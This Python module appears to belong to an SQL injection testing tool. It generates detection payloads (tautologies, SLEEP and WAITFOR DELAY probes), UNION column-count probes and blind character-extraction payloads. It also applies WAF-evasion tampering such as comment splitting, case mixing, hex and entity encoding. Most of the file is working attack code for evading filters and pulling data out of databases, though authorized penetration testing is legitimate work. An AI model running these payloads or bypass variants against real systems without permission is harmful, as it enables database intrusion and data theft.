"""
Payload management system for SQL injection testing.
Handles payload generation, tamper techniques, and encoding methods.
"""
import json
import base64
import urllib.parse
import re
import random
from typing import Dict, List, Any, Optional, Callable
from pathlib import Path

from ..core.base import BaseModule, ScanConfig, DBType, TamperType
from ..utils.logger import get_logger


class PayloadManager(BaseModule):
    """
    Manages SQL injection payloads, tamper techniques, and encoding methods.
    Provides dynamic payload generation based on database type and injection context.
    """
    
    def __init__(self, config: ScanConfig):
        super().__init__(config)
        self.logger = get_logger("payload_manager")
        self.payloads = self._load_payloads()
        self.tamper_functions = self._initialize_tamper_functions()
    
    def _load_payloads(self) -> Dict[str, Any]:
        """Load payloads from JSON file."""
        payload_file = Path(__file__).parent.parent / "payloads" / "payloads.json"
        
        try:
            with open(payload_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            self.logger.error(f"Payload file not found: {payload_file}")
            return self._get_default_payloads()
        except json.JSONDecodeError as e:
            self.logger.error(f"Error parsing payload file: {e}")
            return self._get_default_payloads()
    
    def _get_default_payloads(self) -> Dict[str, Any]:
        """Return basic default payloads if file loading fails."""
        return {
            "detection_payloads": {
                "error_based": ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1"],
                "boolean_based": {
                    "true_conditions": ["' AND '1'='1", "\" AND \"1\"=\"1"],
                    "false_conditions": ["' AND '1'='2", "\" AND \"1\"=\"2"]
                },
                "time_based": {
                    "mysql": ["' OR SLEEP(5)--"],
                    "postgresql": ["' OR pg_sleep(5)--"],
                    "mssql": ["'; WAITFOR DELAY '00:00:05'; --"]
                }
            }
        }
    
    def _initialize_tamper_functions(self) -> Dict[TamperType, Callable]:
        """Initialize tamper function mappings."""
        return {
            TamperType.URL_ENCODE: self._url_encode,
            TamperType.HEX_ENCODE: self._hex_encode,
            TamperType.HTML_ENTITY: self._html_entity_encode,
            TamperType.XML_ENTITY: self._xml_entity_encode,
            TamperType.COMMENT_SPLIT: self._comment_split,
            TamperType.CASE_MIX: self._case_mix,
            TamperType.CONCAT_SPLIT: self._concat_split
        }
    
    def get_detection_payloads(self, injection_type: str) -> List[str]:
        """
        Get detection payloads for a specific injection type.
        
        Args:
            injection_type: Type of injection (error_based, boolean_based, etc.)
            
        Returns:
            List of detection payloads
        """
        payloads = self.payloads.get("detection_payloads", {})
        
        if injection_type == "error_based":
            return payloads.get("error_based", [])
        elif injection_type == "boolean_based":
            boolean_payloads = payloads.get("boolean_based", {})
            return {
                "true": boolean_payloads.get("true_conditions", []),
                "false": boolean_payloads.get("false_conditions", [])
            }
        elif injection_type == "time_based":
            return payloads.get("time_based", {})
        elif injection_type == "union_based":
            return payloads.get("union_based", {})
        else:
            return []
    
    def get_exploitation_payloads(self, db_type: DBType, operation: str) -> Dict[str, str]:
        """
        Get exploitation payloads for a specific database and operation.
        
        Args:
            db_type: Target database type
            operation: Type of operation (information_extraction, blind_extraction, etc.)
            
        Returns:
            Dictionary of operation-specific payloads
        """
        exploitation_payloads = self.payloads.get("exploitation_payloads", {})
        
        if operation not in exploitation_payloads:
            return {}
        
        db_name = db_type.value if db_type != DBType.UNKNOWN else "mysql"
        
        operation_payloads = exploitation_payloads[operation]
        
        if db_name in operation_payloads:
            return operation_payloads[db_name]
        else:
            # Return first available database payloads as fallback
            return next(iter(operation_payloads.values()), {})
    
    def generate_time_payloads(self, db_type: DBType, delay: int = 5) -> List[str]:
        """
        Generate time-based payloads for a specific database type.
        
        Args:
            db_type: Target database type
            delay: Time delay in seconds
            
        Returns:
            List of time-based payloads
        """
        time_payloads = self.get_detection_payloads("time_based")
        db_name = db_type.value if db_type != DBType.UNKNOWN else "mysql"
        
        if db_name not in time_payloads:
            # Use MySQL as default
            db_name = "mysql"
        
        payloads = time_payloads.get(db_name, [])
        
        # Replace {delay} placeholder with actual delay
        return [payload.format(delay=delay) for payload in payloads]
    
    def generate_union_column_payloads(self, max_columns: int = 20) -> List[str]:
        """
        Generate UNION payloads for column count detection.
        
        Args:
            max_columns: Maximum number of columns to test
            
        Returns:
            List of UNION payloads with increasing column counts
        """
        payloads = []
        
        for i in range(1, max_columns + 1):
            null_values = ",".join(["NULL"] * i)
            payloads.extend([
                f"' UNION SELECT {null_values}--",
                f"\" UNION SELECT {null_values}--",
                f"') UNION SELECT {null_values}--",
                f"\") UNION SELECT {null_values}--"
            ])
        
        return payloads
    
    def generate_blind_extraction_payload(self, db_type: DBType, query: str, 
                                        position: int, ascii_value: int, 
                                        extraction_type: str = "character") -> str:
        """
        Generate blind extraction payload for character-by-character extraction.
        
        Args:
            db_type: Target database type
            query: SQL query to extract data from
            position: Character position to extract
            ascii_value: ASCII value to compare against
            extraction_type: Type of extraction (character, length, binary_search)
            
        Returns:
            Blind extraction payload
        """
        blind_payloads = self.get_exploitation_payloads(db_type, "blind_extraction")
        
        if extraction_type not in blind_payloads:
            extraction_type = "character_extraction"
        
        payload_template = blind_payloads.get(extraction_type, "")
        
        if isinstance(payload_template, dict):
            db_name = db_type.value if db_type != DBType.UNKNOWN else "mysql"
            payload_template = payload_template.get(db_name, "")
        
        return payload_template.format(
            query=query,
            position=position,
            ascii_value=ascii_value,
            length=ascii_value  # For length detection, ascii_value represents length
        )
    
    def apply_tamper(self, payload: str, tamper_methods: List[TamperType]) -> str:
        """
        Apply tamper techniques to a payload.
        
        Args:
            payload: Original payload
            tamper_methods: List of tamper methods to apply
            
        Returns:
            Tampered payload
        """
        result = payload
        
        for tamper_method in tamper_methods:
            if tamper_method in self.tamper_functions:
                result = self.tamper_functions[tamper_method](result)
                self.logger.debug(f"Applied {tamper_method.value}: {result}")
        
        return result
    
    def get_waf_bypass_variants(self, payload: str) -> List[str]:
        """
        Generate WAF bypass variants of a payload.
        
        Args:
            payload: Original payload
            
        Returns:
            List of bypass variants
        """
        variants = [payload]  # Include original
        
        waf_bypass = self.payloads.get("waf_bypass", {})
        
        # Keyword splitting
        if "keyword_splitting" in waf_bypass:
            for variant in waf_bypass["keyword_splitting"]:
                modified = payload
                for keyword in ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]:
                    if keyword in modified.upper():
                        modified = modified.replace(keyword, variant)
                        modified = modified.replace(keyword.lower(), variant.lower())
                variants.append(modified)
        
        # Case variations
        if "case_variations" in waf_bypass:
            for case_variant in waf_bypass["case_variations"]:
                modified = self._apply_case_variation(payload, case_variant)
                variants.append(modified)
        
        # Whitespace variations
        if "whitespace_variations" in waf_bypass:
            for ws_variant in waf_bypass["whitespace_variations"]:
                modified = payload.replace(" ", ws_variant.replace("SELECT", "").replace("UNION", ""))
                variants.append(modified)
        
        return list(set(variants))  # Remove duplicates
    
    def _url_encode(self, payload: str) -> str:
        """URL encode the payload."""
        return urllib.parse.quote(payload, safe='')
    
    def _hex_encode(self, payload: str) -> str:
        """Hex encode the payload."""
        hex_encoded = ''.join([f'%{ord(c):02X}' for c in payload])
        return hex_encoded
    
    def _html_entity_encode(self, payload: str) -> str:
        """HTML entity encode special characters."""
        html_entities = {
            "'": "&#39;",
            '"': "&#34;",
            "<": "&lt;",
            ">": "&gt;",
            "&": "&amp;",
            " ": "&#32;"
        }
        
        result = payload
        for char, entity in html_entities.items():
            result = result.replace(char, entity)
        return result
    
    def _xml_entity_encode(self, payload: str) -> str:
        """XML entity encode special characters."""
        xml_entities = {
            "'": "&apos;",
            '"': "&quot;",
            "<": "&lt;",
            ">": "&gt;",
            "&": "&amp;"
        }
        
        result = payload
        for char, entity in xml_entities.items():
            result = result.replace(char, entity)
        return result
    
    def _comment_split(self, payload: str) -> str:
        """Split keywords with comments."""
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]
        result = payload
        
        for keyword in keywords:
            if keyword in result.upper():
                # Split keyword in the middle with comment
                mid = len(keyword) // 2
                split_keyword = keyword[:mid] + "/**/" + keyword[mid:]
                result = result.replace(keyword, split_keyword)
                result = result.replace(keyword.lower(), split_keyword.lower())
        
        return result
    
    def _case_mix(self, payload: str) -> str:
        """Mix case of characters randomly."""
        result = ""
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.choice([True, False]) else char.lower()
            else:
                result += char
        return result
    
    def _concat_split(self, payload: str) -> str:
        """Split strings using concatenation."""
        # Find quoted strings and split them
        import re
        
        def split_string(match):
            quote = match.group(1)
            content = match.group(2)
            if len(content) > 2:
                mid = len(content) // 2
                return f"{quote}{content[:mid]}{quote}+{quote}{content[mid:]}{quote}"
            return match.group(0)
        
        # Match both single and double quoted strings
        result = re.sub(r"(['\"])([^'\"]+)\1", split_string, payload)
        return result
    
    def _apply_case_variation(self, payload: str, pattern: str) -> str:
        """Apply case variation pattern to payload."""
        # Extract case pattern from example
        case_pattern = []
        for char in pattern:
            if char.isalpha():
                case_pattern.append(char.isupper())
        
        result = ""
        pattern_index = 0
        
        for char in payload:
            if char.isalpha() and pattern_index < len(case_pattern):
                result += char.upper() if case_pattern[pattern_index] else char.lower()
                pattern_index += 1
            else:
                result += char
        
        return result
    
    def generate_custom_payload(self, template: str, **kwargs) -> str:
        """
        Generate custom payload from template.
        
        Args:
            template: Payload template with placeholders
            **kwargs: Values to substitute in template
            
        Returns:
            Generated payload
        """
        try:
            return template.format(**kwargs)
        except KeyError as e:
            self.logger.warning(f"Missing template parameter: {e}")
            return template
    
    def get_payload_complexity_score(self, payload: str) -> float:
        """
        Calculate complexity score for a payload (for ordering/prioritization).
        
        Args:
            payload: Payload to analyze
            
        Returns:
            Complexity score (0.0 to 1.0)
        """
        score = 0.0
        
        # Length factor
        score += min(len(payload) / 100, 0.3)
        
        # Special characters
        special_chars = ["'", '"', "(", ")", "--", "/*", "*/", "UNION", "SELECT"]
        special_count = sum(1 for char in special_chars if char in payload.upper())
        score += min(special_count / len(special_chars), 0.3)
        
        # SQL keywords
        sql_keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "SLEEP", "WAITFOR"]
        keyword_count = sum(1 for keyword in sql_keywords if keyword in payload.upper())
        score += min(keyword_count / len(sql_keywords), 0.4)
        
        return min(score, 1.0)
    
    def filter_payloads_by_context(self, payloads: List[str], context: str) -> List[str]:
        """
        Filter payloads based on injection context.
        
        Args:
            payloads: List of payloads to filter
            context: Injection context (numeric, string, etc.)
            
        Returns:
            Filtered list of payloads
        """
        if context == "numeric":
            # For numeric contexts, remove quote-based payloads
            return [p for p in payloads if not (p.startswith("'") or p.startswith('"'))]
        elif context == "string":
            # For string contexts, prioritize quote-based payloads
            return [p for p in payloads if p.startswith("'") or p.startswith('"')]
        else:
            # Return all payloads for unknown context
            return payloads
    
    def optimize_payload_order(self, payloads: List[str]) -> List[str]:
        """
        Optimize payload order for efficiency (simpler payloads first).
        
        Args:
            payloads: List of payloads to order
            
        Returns:
            Ordered list of payloads
        """
        return sorted(payloads, key=self.get_payload_complexity_score)